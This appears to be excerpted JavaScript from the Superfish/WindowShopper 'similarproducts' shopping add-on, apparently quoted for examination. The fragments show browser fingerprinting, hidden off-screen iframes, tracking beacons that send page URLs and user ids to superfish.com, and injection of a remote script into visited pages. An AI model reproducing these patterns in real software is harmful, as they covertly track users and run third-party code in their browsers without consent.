        crosscabriolet|nissan(.+)?nv cargo|nissan(.+)?nv cargo nv1500|nissan(.+)?nv cargo nv2500 hd|nissan(.+)?nv cargo
        nv3500 hd|nissan(.+)?nv passenger|nissan(.+)?nv passenger nv3500
        hd|nissan(.+)?nv200|nissan(.+)?nx|nissan(.+)?pathfinder|nissan(.+)?pathfinder
        hybrid|nissan(.+)?pickup|nissan(.+)?pulsar|nissan(.+)?quest|nissan(.+)?rogue|nissan(.+)?rogue
        select|nissan(.+)?sentra|nissan(.+)?stanza|nissan(.+)?titan|nissan(.+)?truck|nissan(.+)?van|nissan(.+)?versa|nissan(.+)?versa
        note|nissan(.+)?xterra|oldsmobile(.+)?achieva|oldsmobile(.+)?alero|oldsmobile(.+)?aurora|oldsmobile(.+)?bravada|oldsmobile(.+)?calais|oldsmobile(.+)?ciera|oldsmobile(.+)?custom
        cruiser|oldsmobile(.+)?cutlass|oldsmobile(.+)?cutlass calais|oldsmobile(.+)?cutlass ciera|oldsmobile(.+)?cutlass
        cruiser|oldsmobile(.+)?cutlass salon|oldsmobile(.+)?cutlass supreme|oldsmobile(.+)?delta 88|oldsmobile(.+)?delta
        eighty-eight royale|oldsmobile(.+)?eighty-eight|oldsmobile(.+)?eighty-eight
        royale|oldsmobile(.+)?firenza|oldsmobile(.+)?intrigue|oldsmobile(.+)?lss|oldsmobile(.+)?ninety-eight|oldsmobile(.+)?omega|oldsmobile(.+)?regency|oldsmobile(.+)?silhouette|oldsmobile(.+)?toronado|panoz(.+)?aiv
        roadster|panoz(.+)?esperante|panoz(.+)?roadster|peugeot(.+)?405|peugeot(.+)?504|peugeot(.+)?505|peugeot(.+)?604|peugeot(.+)?liberte|plymouth(.+)?acclaim|plymouth(.+)?breeze|plymouth(.+)?caravelle|plymouth(.+)?colt|plymouth(.+)?conquest|plymouth(.+)?fury|plymouth(.+)?gran
        fury|plymouth(.+)?grand
        voyager|plymouth(.+)?horizon|plymouth(.+)?laser|plymouth(.+)?neon|plymouth(.+)?pickup|plymouth(.+)?prowler|plymouth(.+)?reliant|plymouth(.+)?sapporo|plymouth(.+)?scamp|plymouth(.+)?sundance|plymouth(.+)?turismo|plymouth(.+)?van|plymouth(.+)?voyager|pontiac(.+)?1000|pontiac(.+)?2000|pontiac(.+)?6000|pontiac(.+)?aztek|pontiac(.+)?bonneville|pontiac(.+)?fiero|pontiac(.+)?firebird|pontiac(.+)?g3|pontiac(.+)?g5|pontiac(.+)?g6|pontiac(.+)?g8|pontiac(.+)?grand
        am|pontiac(.+)?grand prix|pontiac(.+)?gto|pontiac(.+)?lemans|pontiac(.+)?montana|pontiac(.+)?montana
        sv6|pontiac(.+)?parisienne|pontiac(.+)?phoenix|pontiac(.+)?safari|pontiac(.+)?solstice|pontiac(.+)?sunbird|pontiac(.+)?sunfire|pontiac(.+)?t1000|pontiac(.+)?torrent|pontiac(.+)?trans
        sport|pontiac(.+)?vibe|porsche(.+)?911|porsche(.+)?924|porsche(.+)?928|porsche(.+)?944|porsche(.+)?968|porsche(.+)?boxster|porsche(.+)?carrera
        gt|porsche(.+)?cayenne|porsche(.+)?cayenne hybrid|porsche(.+)?cayman|porsche(.+)?cayman
        s|porsche(.+)?macan|porsche(.+)?panamera|porsche(.+)?panamera e-hybrid|porsche(.+)?panamera
        hybrid|qvale(.+)?mangusta|ram(.+)?1500|ram(.+)?2500|ram(.+)?3500|ram(.+)?c\/v|ram(.+)?cargo|ram(.+)?promaster
        1500|ram(.+)?promaster 2500|ram(.+)?promaster 2500 window van|ram(.+)?promaster 3500|ram(.+)?promaster cab
        chassis|ram(.+)?promaster cargo|ram(.+)?promaster cutaway chassis|ram(.+)?ram chassis 3500|ram(.+)?ram chassis
        4500|ram(.+)?ram pickup 1500|ram(.+)?ram pickup 2500|ram(.+)?ram pickup
        3500|renault(.+)?18i|renault(.+)?alliance|renault(.+)?fuego|renault(.+)?lecar|renault(.+)?sport
        wagon|rolls-royce(.+)?camargue|rolls-royce(.+)?corniche|rolls-royce(.+)?ghost|rolls-royce(.+)?park
        ward|rolls-royce(.+)?phantom|rolls-royce(.+)?phantom coupe|rolls-royce(.+)?phantom drophead
        coupe|rolls-royce(.+)?phantom vi|rolls-royce(.+)?silver dawn|rolls-royce(.+)?silver
        seraph|rolls-royce(.+)?silver spirit|rolls-royce(.+)?silver spur|rolls-royce(.+)?silver spur
        ii|rolls-royce(.+)?wraith|saab(.+)?900|saab(.+)?9000|saab(.+)?3-Sep|saab(.+)?5-Sep|saab(.+)?9-2x|saab(.+)?9-3x|saab(.+)?9-4x|saab(.+)?9-7x|saleen(.+)?s7|saturn(.+)?astra|saturn(.+)?aura|saturn(.+)?aura
        green line|saturn(.+)?aura hybrid|saturn(.+)?ion|saturn(.+)?ion red
        line|saturn(.+)?l|saturn(.+)?l-series|saturn(.+)?l300|saturn(.+)?ls|saturn(.+)?lw|saturn(.+)?outlook|saturn(.+)?relay|saturn(.+)?s-series|saturn(.+)?sc|saturn(.+)?sky|saturn(.+)?sl|saturn(.+)?sw|saturn(.+)?vue|saturn(.+)?vue
        green line|saturn(.+)?vue
        hybrid|scion(.+)?fr-s|scion(.+)?iq|scion(.+)?tc|scion(.+)?xa|scion(.+)?xb|scion(.+)?xd|smart(.+)?fortwo|smart(.+)?fortwo
        electric drive|spyker(.+)?c8|spyker(.+)?c8 aileron|spyker(.+)?c8
        laviolette|srt(.+)?viper|sterling(.+)?825|sterling(.+)?827|subaru(.+)?1600|subaru(.+)?1800|subaru(.+)?b9
        tribeca|subaru(.+)?baja|subaru(.+)?brat|subaru(.+)?brz|subaru(.+)?dl|subaru(.+)?forester|subaru(.+)?gl|subaru(.+)?gl-10|subaru(.+)?impreza|subaru(.+)?impreza
        outback sport|subaru(.+)?impreza wrx|subaru(.+)?impreza wrx
        sti|subaru(.+)?justy|subaru(.+)?legacy|subaru(.+)?loyale|subaru(.+)?outback|subaru(.+)?rx|subaru(.+)?std|subaru(.+)?svx|subaru(.+)?tribeca|subaru(.+)?xt|subaru(.+)?xv
        crosstrek|subaru(.+)?xv crosstrek
        hybrid|suzuki(.+)?aerio|suzuki(.+)?equator|suzuki(.+)?esteem|suzuki(.+)?forenza|suzuki(.+)?grand
        vitara|suzuki(.+)?kizashi|suzuki(.+)?reno|suzuki(.+)?samurai|suzuki(.+)?sidekick|suzuki(.+)?swift|suzuki(.+)?sx4|suzuki(.+)?sx4
        crossover|suzuki(.+)?sx4 sport|suzuki(.+)?sx4
        sportback|suzuki(.+)?verona|suzuki(.+)?vitara|suzuki(.+)?x-90|suzuki(.+)?xl7|tesla(.+)?model
        s|tesla(.+)?roadster|tesla(.+)?tesla roadster|toyota(.+)?4runner|toyota(.+)?avalon|toyota(.+)?avalon
        hybrid|toyota(.+)?camry|toyota(.+)?camry hybrid|toyota(.+)?camry
        solara|toyota(.+)?celica|toyota(.+)?corolla|toyota(.+)?cressida|toyota(.+)?echo|toyota(.+)?fj
        cruiser|toyota(.+)?highlander|toyota(.+)?highlander hybrid|toyota(.+)?land
        cruiser|toyota(.+)?matrix|toyota(.+)?mr2|toyota(.+)?mr2
        spyder|toyota(.+)?paseo|toyota(.+)?pickup|toyota(.+)?previa|toyota(.+)?prius|toyota(.+)?prius c|toyota(.+)?prius
        plug-in|toyota(.+)?prius plug-in hybrid|toyota(.+)?prius v|toyota(.+)?rav4|toyota(.+)?rav4
        ev|toyota(.+)?sequoia|toyota(.+)?sienna|toyota(.+)?starlet|toyota(.+)?supra|toyota(.+)?t100|toyota(.+)?tacoma|toyota(.+)?tercel|toyota(.+)?tundra|toyota(.+)?van|toyota(.+)?venza|toyota(.+)?yaris|volkswagen(.+)?beetle|volkswagen(.+)?cabrio|volkswagen(.+)?cabriolet|volkswagen(.+)?cc|volkswagen(.+)?corrado|volkswagen(.+)?e-golf|volkswagen(.+)?eos|volkswagen(.+)?eurovan|volkswagen(.+)?fox|volkswagen(.+)?gli|volkswagen(.+)?golf|volkswagen(.+)?golf
        r|volkswagen(.+)?gti|volkswagen(.+)?jetta|volkswagen(.+)?jetta hybrid|volkswagen(.+)?jetta
        sportwagen|volkswagen(.+)?new beetle|volkswagen(.+)?new
        cabrio|volkswagen(.+)?passat|volkswagen(.+)?phaeton|volkswagen(.+)?quantum|volkswagen(.+)?r32|volkswagen(.+)?rabbit|volkswagen(.+)?routan|volkswagen(.+)?scirocco|volkswagen(.+)?tiguan|volkswagen(.+)?touareg|volkswagen(.+)?touareg
        2|volkswagen(.+)?touareg
        hybrid|volkswagen(.+)?van|volkswagen(.+)?vanagon|volvo(.+)?240|volvo(.+)?740|volvo(.+)?760|volvo(.+)?780|volvo(.+)?850|volvo(.+)?940|volvo(.+)?960|volvo(.+)?760gt|volvo(.+)?c30|volvo(.+)?c70|volvo(.+)?coupe|volvo(.+)?dl|volvo(.+)?gl|volvo(.+)?glt|volvo(.+)?s40|volvo(.+)?s60|volvo(.+)?s60
        r|volvo(.+)?s70|volvo(.+)?s80|volvo(.+)?s90|volvo(.+)?v40|volvo(.+)?v50|volvo(.+)?v60|volvo(.+)?v70|volvo(.+)?v70
        r|volvo(.+)?v90|volvo(.+)?xc|volvo(.+)?xc60|volvo(.+)?xc70|volvo(.+)?xc90|yugo(.+)?cabrio|yugo(.+)?gv)\b/gim;
        ...
        {
        return
        /^(IE|CH|ES|US|AU|BE|IT|AT|NO|CA|DE|NL|SE|GB|DK|FR|BR|NZ|AR|MX|CL|CO|RU)$/i.test(similarproducts.b.userData.uc
        || '');
        }
        ...
        var chr;
        var userHash = 0 ;
        var str = navigator.userAgent + navigator.platform + screen.height + screen.pixelDepth + screen.width +
        ...
        extractDomainName: function(url, method) // the method param is for a/b testing purposes, we will remove it and
        the additional legacy extraction algorithms later
        {
        ...
        pricing : prSpl = {
        prReg:
        /(([\$\£\€\u20AC]|eur|ils|rs)\.?\s*(<[^>]+>|&nbsp;|\s)?([0-9]+[\,\.])?[0-9]+([\,\.][0-9]+)?)|(([0-9]+[\,\.])?[0-9]+([\,\.][0-9]+)?)(<[^>]+>|&nbsp;|\s|\s\,\-\s)?(€|\u20AC|eur|ils|rs)\.?/ig,
        pageType: '',
        jq:0,
        imgData:{},
        priceFont:0,
        ...
        if(dl[i].tag == dl[j].tag && (dl[i].cl && dl[i].cl == dl[j].cl && dl[i].price != dl[j].price || dl[i].stl &&
        dl[i].stl == dl[j].stl) /* && !dl[i].id */) {
        j = ++i;
        dl[i].inv = 1;
        }
        }
        ...
        tx = tx.replace(/\s+/g, " ");
        pr =
        tx.match(/((from:?(&nbsp;|\s))?<[^\/>]+>\s*(now|sale|us|au|r)?\s*([\$\£\€\u20AC]|usd|eur|ils|rs)\.?\s*(<[^>]+>|&nbsp;|\s)?\s*([0-9]+[\,\.])?[0-9]+([\,\.][0-9]+)?(<[^>]+>[^<]+<\/[^>]+>)?)(&nbsp;|\s)?(\([0-9]+%\))?|((from:?(&nbsp;|\s))?<[^\/>]+>\s*?(([0-9]+[\,\.])?[0-9]+([\,\.][0-9]+)?)(<[^>]+>|&nbsp;|\s|\s\,\-\s)?(€|usd|eur|ils|rs)\.?(&nbsp;|\s)?(\([0-9]+%\))?)/ig);
        if (pr && pr.length) {
        ...
        objs = this.jq(pnd).find(findBy+item.replace(/[!"#$%&'()*+,.\/:;<=>?@[\\\]^`{|}~]/g, '\\\$&').replace(/
        /g,findBy));
        if(objs.length<=mx){
        ...
        // dataObj.tier1_bucket = ((similarproducts.b.qsObj && similarproducts.b.qsObj.bucket ) || (window.qsObj &&
        window.qsObj.bucket )) || dataObj.tier1.bucket;
        // dataObj.tier2_bucket = ((similarproducts.b.qsObj && similarproducts.b.qsObj.bucket ) || (window.qsObj &&
        window.qsObj.bucket )) || dataObj.tier2.bucket;
        // }
        ...
        if( window.location.href.indexOf( "amazon.com/" ) > 0 && window.location.href.indexOf( "/search/" ) > 0 &&
        window.location.href.indexOf( "#sf" ) > 0 ){
        ...
        similarproducts.b.qsObj.partnername =
        similarproducts.b.encodeDecode(true,similarproducts.b.qsObj.partnername.toLowerCase());
        similarproducts.b.initialQS = similarproducts.b.initialQS.replace(/partnername=([^&]*)?/gi, 'partnername=' +
        similarproducts.b.qsObj.partnername);
        }
        ...
        this.serverLayerFrame.style.cssText = 'position:absolute; width:1px; height:1px; left:-100px; top:-100px;
        visibility:hidden';
        this.serverLayerFrame.src = this.appDomain + 'debugger/server_layer.html?version=' +
        similarproducts.b.appVersion+'&consoleUniqueId='+this.consoleUniqueId;
        ...
        this.consoleFrame.style.cssText = 'position:fixed; width:100%; height:300px; left:0; bottom:0; z-index:19000000;
        border: 0 none;';
        this.consoleFrame.src = this.appDomain + 'debugger/console.html?version=' +
        similarproducts.b.appVersion+'&consoleUniqueId='+this.consoleUniqueId;
        ...
        {
        this.consoleWindow = window.open(this.appDomain +
        'debugger/console.html?standalone=1&consoleUniqueId='+this.consoleUniqueId+'version=' +
        similarproducts.b.appVersion, 'WindowShopperConsole',
        'width=500,height=500,resizable,scrollbars=yes,status=no');
        ...
        {
        this.createServerLayer(this.appDomain +
        'co/server_layer.html?version='+this.currentVersion+'&pluginDomain='+encodeURIComponent(this.appDomain)+'&url='+encodeURIComponent(location.href));
        }
        else
        {
        ...
        {
        this.registerFrame = this.createServerLayer(this.appDomain + 'co/register_server_layer.html?version=' +
        this.currentVersion);
        },
        ...
        serverLayerFrame.style.cssText = 'position:absolute; width:1px; height:1px; left:-100px; top:-100px;
        visibility:hidden';
        ...
        request = new Image();
        request.src =
        'https://www.superfish.com/ws/trackSession.action?action=sample-user-traffic&dlsource='+similarproducts.b.qsObj.dlsource+'&page_url='
        ...
        spsupport.isShowConduitWinFirstTimeIcons = similarproducts.b.qsObj.isShowConduitWinFirstTimeIcons == "true" ||
        similarproducts.b.qsObj.isShowConduitWinFirstTimeIcons == "1";
        ...
        var url = sfDomain + "trackSession.action?userid=" + similarproducts.b.qsObj.userid +
        "&sessionid=-10&action=ud_host_failed";
        if (typeof(similarproducts.utilities.abTestUtil) != 'undefined' && similarproducts.utilities.abTestUtil &&
        ...
        iframe.setAttribute("style", "position:absolute; top:-100px; left:-100px; z-index: -10; border: none;
        visibility: hidden;");
        ...
        similarproducts.b.qsObj.userId = data.ut.userId;
        similarproducts.b.initialQS = similarproducts.b.initialQS.replace(/userid=([^&]*)?/gi, 'userid=' +
        data.ut.userId);
        setABData(data);
        }
        }
        ...
        similarproducts.b.userData.ut.tier1.bucket = (similarproducts.b.qsObj && similarproducts.b.qsObj.bucket) ||
        similarproducts.b.userData.ut.tier1.bucket;
        similarproducts.b.userData.ut.tier2.bucket = (similarproducts.b.qsObj && similarproducts.b.qsObj.bucket) ||
        similarproducts.b.userData.ut.tier2.bucket;
        ...
        similarproducts.b.userData.autoOpenFullUi = data.autoOpenFullUi || 0;
        ...
        if (!similarproducts.utilities.blacklistHandler.isWSBlacklist() &&
        !similarproducts.utilities.blacklistHandler.isPageBlacklist() ||
        !similarproducts.utilities.blacklistHandler.isCPNBlacklist() ||
        similarproducts.utilities.blacklistHandler.isCarsDomainWhiteList())
        {
        ...
        {
        camSampleTrafficParams.hasOwnProperty(key) &&
        camSampleTrafficQueryString.push(key+'='+encodeURIComponent(camSampleTrafficParams[key]));
        }
        ...
        {
        hpSampleTrafficParams.hasOwnProperty(key) &&
        hpSampleTrafficQueryString.push(key+'='+encodeURIComponent(hpSampleTrafficParams[key]));
        }

        var hpSampleTrafficImg = new Image();
        hpSampleTrafficImg.src = spsupport.pluginDomain + 'trackSession.action?' + hpSampleTrafficQueryString.join('&')
        + similarproducts.utilities.abTestUtil.getDataString();
        }
        ...
        {
        userDataFlowParams.hasOwnProperty(key) &&
        userDataFlowQueryString.push(key+'='+encodeURIComponent(userDataFlowParams[key]));
        }

        var userDataFlowImg = new Image();
        userDataFlowImg.src = spsupport.pluginDomain + 'trackSession.action?' + userDataFlowQueryString.join('&') +
        similarproducts.utilities.abTestUtil.getDataString();
        }

        // Disable WS for Lenovo in not paying countries or bestbuy.com
        if (similarproducts.b.qsObj.dlsource == 'hdrykzc' &&
        (!similarproducts.utilities.blacklistHandler.isPayingCountry() || merchantName === 'bestbuy.com'))
        {
        return;
        }

        similarproducts.b.inj(window.document, spsupport.pluginDomain + 'sf_code.jsp' + similarproducts.b.initialQS +
        sfCodeAdditionalParams,1)
        }, "*sfxd*");
        ...
        var cond = (spsupport.whiteStage.rv || spsupport.whiteStage.st || (similarproducts.sg &&
        similarproducts.sg.sSite ? true : this.imgs.length < this.limit));
        ...
        "<div id='filters'><span class='label'>Filter By:</span></span><span id='free'><input class='filter'
        type='text'/><span id='clear'>X</span></span></div>" +
        ...
        var urlBox = "<div id='url-box'><div><span class='pointer'></span><a target='_blank' href='' id='api'>open api
        service<a href='' target='_blank' id='search'>open search service</a></div></div>";
        ...
        return h + ":" + (m.length > 1 ? m : "0"+m) + ":" + (s.length > 1 ? s : "0"+s) + ":" + (ms.length > 2 ? ms :
        (ms.length > 1 ? "0"+ms : "00"+ms));
        }
